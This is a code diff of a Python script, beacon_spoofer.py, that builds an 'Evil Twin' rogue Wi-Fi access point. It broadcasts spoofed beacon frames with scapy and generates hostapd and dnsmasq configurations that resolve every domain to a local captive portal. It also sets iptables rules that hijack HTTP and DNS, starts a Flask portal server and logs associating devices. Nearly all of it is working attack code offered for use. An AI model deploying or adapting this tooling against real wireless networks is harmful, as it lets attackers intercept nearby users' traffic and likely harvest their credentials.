@@ -1,123 +1,143 @@
-from threading import Thread
-from scapy.all import *
-import time
+# beacon_spoofer.py
+
 import os
 import sys
 import signal
+import time
+import subprocess
+from threading import Thread
+from scapy.all import *
 
-if len(sys.argv) != 3:
-    print("Usage: python3 beacon_spoofer.py <SSID> <interface>")
-    exit(1)
+CAPTIVE_IP = "192.168.24.1"
 
-ssid = sys.argv[1]
-iface = sys.argv[2]
-bssid = "00:11:22:33:44:55"  # Static fake MAC address
-CAPTIVEPORTAL_IP = "192.168.24.1"
+# === ARGUMENT CHECK ===
+def usage():
+    print("Usage: sudo python3 beacon_spoofer.py <SSID> <interface> <bssid>")
+    sys.exit(1)
 
+if len(sys.argv) != 4:
+    usage()
 
-def generate_dnsmasq_conf(interface, captive_ip, dhcp_start="192.168.24.50", dhcp_end="192.168.24.250", netmask="255.255.255.0"):
-    conf_text = (
-        f"bogus-priv\n"
-        f"local=/localnet/\n"
-        f"interface={interface}\n"
-        f"domain=localnet\n"
-        f"dhcp-range={dhcp_start},{dhcp_end},2h\n"
-        f"address=/connectivitycheck.gstatic.com/{captive_ip}\n"
-        f"address=/captive.apple.com/{captive_ip}\n"
-        f"address=/#/{captive_ip}\n"
-        f"dhcp-option=1,{netmask}\n"
-        f"dhcp-option=3,{captive_ip}\n"
-        f"dhcp-option=6,{captive_ip}\n"
-        f"dhcp-authoritative\n"
-    )
+ssid, iface, bssid = sys.argv[1], sys.argv[2], sys.argv[3]
 
-    with open("dnsmasq.conf", "w") as conf_file:
-        conf_file.write(conf_text)
+# === CONFIG GENERATORS ===
+def generate_dnsmasq_conf():
+    conf = f"""
+interface={iface}
+dhcp-range=192.168.24.50,192.168.24.150,12h
+dhcp-option=3,{CAPTIVE_IP}
+dhcp-option=6,{CAPTIVE_IP}
+address=/#/{CAPTIVE_IP}
+log-queries
+no-resolv
+"""
+    with open("dnsmasq.conf", "w") as f:
+        f.write(conf.strip())
+    print("[+] dnsmasq.conf generated.")
 
-    print("[+] dnsmasq.conf created successfully.")
+def generate_hostapd_conf():
+    conf = f"""
+interface={iface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel=6
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+"""
+    with open("hostapd.conf", "w") as f:
+        f.write(conf.strip())
+    print("[+] hostapd.conf generated.")
 
-def setup_interface_ip(interface, captive_ip, netmask="255.255.255.0"):
-    import os
-    os.system(f"sudo ifconfig {interface} {captive_ip} netmask {netmask} up")
-    print(f"[+] Set {interface} IP to {captive_ip} with netmask {netmask}")
-
-def start_dnsmasq(config_file="dnsmasq.conf"):
-    import subprocess
-    subprocess.Popen(["sudo", "dnsmasq", "-C", config_file])
-    print("[+] dnsmasq started using configuration file:", config_file)
+# === SYSTEM SETUP ===
+def setup_interface_ip():
+    os.system(f"ip link set {iface} up")
+    os.system(f"ip addr add {CAPTIVE_IP}/24 dev {iface}")
+    print(f"[+] Interface {iface} set to {CAPTIVE_IP}")
 
 def setup_iptables():
-    import os
-    os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.24.1:80")
-    os.system("sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.24.1")
-    os.system("sudo iptables -t nat -A POSTROUTING -j MASQUERADE")
-    print("[+] iptables rules set: HTTP redirected to 80, DNS forced to local, MASQUERADE enabled")
+    os.system("iptables -t nat -F")
+    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.24.1:80")
+    os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.24.1")
+    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
+    print("[+] iptables rules set")
 
-def start_server(script_path="web_server/server.py"):
-    import subprocess
-    subprocess.Popen(["sudo", "python3", script_path])
-    print(f"[+] Flask server started using {script_path}")
+# === START SERVICES ===
+def start_hostapd():
+    print("[*] Starting hostapd...")
+    return subprocess.Popen(["hostapd", "hostapd.conf"])
 
-generate_dnsmasq_conf(iface, CAPTIVEPORTAL_IP)
-setup_interface_ip(iface, CAPTIVEPORTAL_IP)
-start_dnsmasq()
-setup_iptables(redirect_port=8080)
-start_server(script_path="web_server/server.py")
+def start_flask_server():
+    print("[*] Starting Flask captive portal...")
+    return subprocess.Popen(
+        ["python3", "web_server/server.py"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
 
-# Create 802.11 beacon frame
-dot11 = Dot11(type=0, subtype=8,
-              addr1="ff:ff:ff:ff:ff:ff",
-              addr2=bssid,
-              addr3=bssid)
-beacon = Dot11Beacon(cap="ESS")
-essid = Dot11Elt(ID="SSID", info=ssid)
-rsn = Dot11Elt(ID=48, info=(
-    '\x01\x00'              # RSN Version
-    '\x00\x0f\xac\x02'      # Group Cipher Suite : 00-0f-ac TKIP
-    '\x02\x00'              # Pairwise Cipher Suite Count
-    '\x00\x0f\xac\x04'      # Pairwise Cipher Suite List : CCMP
-    '\x00\x0f\xac\x02'      # AKM Suite List : PSK
-    '\x00\x00'))            # RSN Capabilities
+def start_dnsmasq():
+    print("[*] Starting dnsmasq...")
+    return subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"])
 
-frame = RadioTap()/dot11/beacon/essid/rsn
+# === SPOOFING LOGIC ===
+def send_beacons():
+    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
+    beacon = Dot11Beacon(cap="ESS")
+    essid = Dot11Elt(ID="SSID", info=ssid)
+    rsn = Dot11Elt(ID=48, info=(
+        '\x01\x00'
+        '\x00\x0f\xac\x02'
+        '\x02\x00'
+        '\x00\x0f\xac\x04'
+        '\x00\x0f\xac\x02'
+        '\x00\x00'
+    ))
+    frame = RadioTap()/dot11/beacon/essid/rsn
 
-print(f"[+] Spoofing SSID: {ssid} on {iface}...")
+    print(f"[+] Broadcasting fake SSID '{ssid}' on {iface}")
+    try:
+        while True:
+            sendp(frame, iface=iface, inter=0.1, loop=0, verbose=0)
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        print("\n[!] Stopped beaconing.")
 
-# Association detection logic
-def detect_associations(iface):
+def sniff_associations():
     seen = set()
     def handler(pkt):
-        if pkt.haslayer(Dot11):
-            client_mac = pkt.addr2
-            if not client_mac or client_mac in seen:
-                return
-            if pkt.haslayer(Dot11Auth) or pkt.haslayer(Dot11AssoReq) or pkt.type == 2:
-                seen.add(client_mac)
-                print(f"[+] Device ASSOCIATED with Evil Twin: {client_mac}")
-
-    print(f"[*] Listening for client associations on {iface}...")
+        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype in [0, 2, 4, 11]:
+            mac = pkt.addr2
+            if mac and mac not in seen:
+                seen.add(mac)
+                print(f"[+] Device associated: {mac}")
     sniff(iface=iface, prn=handler, store=0)
 
-# Launch association detection thread
-assoc_thread = Thread(target=detect_associations, args=(iface,))
-assoc_thread.daemon = True
-assoc_thread.start()
+# === CLEANUP ===
+def cleanup(signum, frame):
+    print("\n[!] Cleaning up...")
+    os.system("iptables -t nat -F")
+    os.system("pkill dnsmasq")
+    os.system("pkill hostapd")
+    sys.exit(0)
 
-stop = False
+signal.signal(signal.SIGINT, cleanup)
+signal.signal(signal.SIGTERM, cleanup)
 
-def handle_sigterm(signum, frame):
-    global stop
-    stop = True
-    print("\n[!] Beacon spoofing stopped.")
+# === RUN SEQUENCE ===
+generate_dnsmasq_conf()
+generate_hostapd_conf()
+setup_interface_ip()
+setup_iptables()
 
-signal.signal(signal.SIGTERM, handle_sigterm)
+hostapd_proc = start_hostapd()
+flask_proc = start_flask_server()
+dns_proc = start_dnsmasq()
 
-while not stop:
-    try:
-        sendp(frame, iface=iface, inter=0.1, loop=0, verbose=0)
-        if stop:
-            break  # Exit the loop immediately if stop is set
-        time.sleep(0.1)  # Allow SIGTERM to be processed during sleep
-    except Exception as e:
-        print(f"[!] Error while sending beacon: {e}")
-        break
+# # Run sniffer in background
+# sniff_thread = Thread(target=sniff_associations)
+# sniff_thread.daemon = True
+# sniff_thread.start()
+
+# # Start beacon broadcast loop
+# send_beacons()
